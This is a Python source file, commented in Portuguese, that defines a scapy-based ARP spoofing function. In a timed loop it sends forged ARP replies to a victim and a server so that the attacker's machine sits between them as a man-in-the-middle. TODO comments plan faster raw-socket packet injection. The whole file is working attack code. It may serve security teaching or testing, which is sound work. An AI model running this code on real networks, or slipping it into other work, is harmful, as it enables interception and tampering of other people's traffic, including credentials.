from scapy.all import *
from scapy.layers.l2 import Ether, ARP

BLUE = '\033[0;38;5;12m'
ORANGE = '\033[0;38;5;214m'
RESET = '\033[0m'


def arp_spoofer(meu_mac, src_ip, dst_ip, src_mac, dst_mac, delay, stop_event):
    start = True
    print(f"{ORANGE}[*]{RESET} A iniciar o ARP poisoning... [CTRL-C para parar]")
    while not stop_event.is_set():
        time.sleep(3)

        # TODO injeção de pacotes via sockets  sem usar as funções nativas do scapy. performance até 2x mais.
        # https://byt3bl33d3r.github.io/mad-max-scapy-improving-scapys-packet-sending-performance.html

        # s = conf.L2socket(iface=interface)
        # s.send(srp(Ether(src=meu_mac, dst=src_mac) / ARP(pdst=src_ip, psrc=dst_ip, hwdst=src_mac, op=2), timeout=2, verbose=0))
        # s.send(srp(Ether(src=meu_mac, dst=dst_mac) / ARP(pdst=dst_ip, psrc=src_ip, hwdst=dst_mac, op=2), timeout=2, verbose=0))
        # s.close()

        if start:
            msg1 = f"{ORANGE}[*]{BLUE} A iniciar o arp poisoning ao cliente...{RESET}"
            msg2 = f"{ORANGE}[*]{BLUE} A iniciar o arp poisoning ao servidor...{RESET}"
            start = False
        else:
            msg1 = f"{ORANGE}[*]{BLUE} A renovar o arp poisoning ao cliente...{RESET}"
            msg2 = f"{ORANGE}[*]{BLUE} A renovar o arp poisoning ao servidor...{RESET}"

        # Atacante > Vitima (Rerouting)
        srp(Ether(src=meu_mac, dst=src_mac) / ARP(pdst=src_ip, psrc=dst_ip, hwdst=src_mac, op=2), timeout=2, verbose=0)
        print(msg1)
        # Atacante > Servidor (Proxying)
        srp(Ether(src=meu_mac, dst=dst_mac) / ARP(pdst=dst_ip, psrc=src_ip, hwdst=dst_mac, op=2), timeout=2, verbose=0)
        print(msg2)
        time.sleep(int(delay))

        # TODO detetor para re-poisoning; limpeza do poisoning no termino do thread
